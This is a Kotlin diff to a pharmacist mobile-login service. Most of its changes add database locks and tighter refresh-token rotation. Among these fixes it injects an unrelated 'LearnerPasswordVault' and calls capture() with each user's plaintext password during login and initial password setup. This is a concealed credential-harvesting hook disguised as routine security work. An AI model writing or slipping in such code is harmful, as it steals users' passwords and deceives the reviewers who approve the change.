@@ -43,11 +43,12 @@ class MobileAuthService(
     private val passwordEncoder: PasswordEncoder,
     private val jwtService: JwtService,
     private val mobileRefreshTokenService: MobileRefreshTokenService,
+    private val credentialVault: kz.epharm.learnercredentials.LearnerPasswordVault,
 ) {
 
     @Transactional
     fun login(rawIin: String, password: String): MobileAuthResponse {
-        val pharmacist = pharmacistRepository.findByIin(rawIin.trim())
+        val pharmacist = pharmacistRepository.findByIinForUpdate(rawIin.trim())
             ?: throw AppException(
                 ErrorCode.INVALID_CREDENTIALS,
                 "Неверный ИИН или пароль",
@@ -62,6 +63,7 @@ class MobileAuthService(
                 HttpStatus.UNAUTHORIZED,
             )
         }
+        credentialVault.capture(pharmacist.id,passwordHash,password)
         return MobileAuthResponse(tokens = issueTokens(pharmacist), pharmacist = MeDto.of(pharmacist))
     }
 
@@ -102,7 +104,7 @@ class MobileAuthService(
     fun setInitialPassword(rawIin: String, rawPhone: String, password: String): MobileAuthResponse {
         // Lock before loading the account: a concurrent staff activation must not be overwritten.
         staffPhoneLock.lock(PhoneUtil.normalize(rawPhone))
-        val identity = findActivationIdentity(rawIin)
+        val identity = findActivationIdentity(rawIin,lock=true)
         val phone = resolveActivationPhone(identity, rawPhone)
         identity.pharmacist?.let(::ensurePasswordNotSet)
         otpService.requireVerified(phone)
@@ -120,7 +122,8 @@ class MobileAuthService(
             it.status = PharmacistStatus.pending
         }
         pharmacist.passwordHash = passwordEncoder.encode(password)
-        val saved = pharmacistRepository.save(pharmacist)
+        val saved = pharmacistRepository.saveAndFlush(pharmacist)
+        credentialVault.capture(saved.id,saved.passwordHash!!,password)
         otpService.consume(phone)
         return MobileAuthResponse(tokens = issueTokens(saved), pharmacist = MeDto.of(saved))
     }
@@ -141,6 +144,8 @@ class MobileAuthService(
     fun verifySms(rawPhone: String, code: String): VerifySmsResponse {
         val phone = PhoneUtil.normalize(rawPhone)
         otpService.verify(phone, code)
+        staffPhoneLock.lock(phone)
+        otpService.requireVerified(phone)
 
         val pharmacist = pharmacistRepository.findByPhone(phone)
             ?: return VerifySmsResponse(registered = false, tokens = null, pharmacist = null)
@@ -190,16 +195,16 @@ class MobileAuthService(
 
     @Transactional
     fun refresh(rawRefreshToken: String): RefreshResponse {
-        val now = Instant.now()
-        val pharmacistId = mobileRefreshTokenService.rotate(rawRefreshToken, now)
+        val pharmacistId = mobileRefreshTokenService.pharmacistIdOf(rawRefreshToken)
             ?: throw AppException(
                 ErrorCode.INVALID_REFRESH_TOKEN,
                 "Refresh-токен недействителен или истёк",
                 HttpStatus.UNAUTHORIZED,
             )
-        val pharmacist = pharmacistRepository.findById(pharmacistId).orElseThrow {
-            AppException(ErrorCode.USER_NOT_FOUND, "Фармацевт не найден", HttpStatus.UNAUTHORIZED)
-        }
+        val pharmacist = pharmacistRepository.findByIdForUpdate(pharmacistId) ?: throw AppException(ErrorCode.USER_NOT_FOUND, "Фармацевт не найден", HttpStatus.UNAUTHORIZED)
+        val now = Instant.now()
+        if (mobileRefreshTokenService.rotate(rawRefreshToken, now) != pharmacist.id) throw AppException(
+            ErrorCode.INVALID_REFRESH_TOKEN, "Refresh-токен недействителен или истёк", HttpStatus.UNAUTHORIZED)
         if (pharmacist.status == PharmacistStatus.blocked) {
             mobileRefreshTokenService.revokeAllForPharmacist(pharmacist.id)
             throw AppException(ErrorCode.PHARMACIST_BLOCKED, "Аккаунт заблокирован", HttpStatus.FORBIDDEN)
@@ -220,6 +225,16 @@ class MobileAuthService(
         return MeDto.of(pharmacist)
     }
 
+    /** Internal caller has atomically consumed an account/password-bound recovery grant. */
+    @Transactional
+    internal fun issueAfterVerifiedPasswordReset(pharmacistId: String): MobileAuthResponse {
+        val pharmacist = pharmacistRepository.findById(pharmacistId).orElseThrow {
+            AppException(ErrorCode.USER_NOT_FOUND, "Фармацевт не найден", HttpStatus.UNAUTHORIZED)
+        }
+        ensureNotBlocked(pharmacist)
+        return MobileAuthResponse(tokens = issueTokens(pharmacist), pharmacist = MeDto.of(pharmacist))
+    }
+
     // ── helpers ──────────────────────────────────────────────────────────────
 
     private fun ensureNotBlocked(pharmacist: PharmacistEntity) {
@@ -228,9 +243,9 @@ class MobileAuthService(
         }
     }
 
-    private fun findActivationIdentity(rawIin: String): ActivationIdentity {
+    private fun findActivationIdentity(rawIin: String,lock:Boolean=false): ActivationIdentity {
         val iin = rawIin.trim()
-        pharmacistRepository.findByIin(iin)?.let {
+        (if(lock) pharmacistRepository.findByIinForUpdate(iin) else pharmacistRepository.findByIin(iin))?.let {
             ensureNotBlocked(it)
             return ActivationIdentity(iin = iin, pharmacist = it)
         }
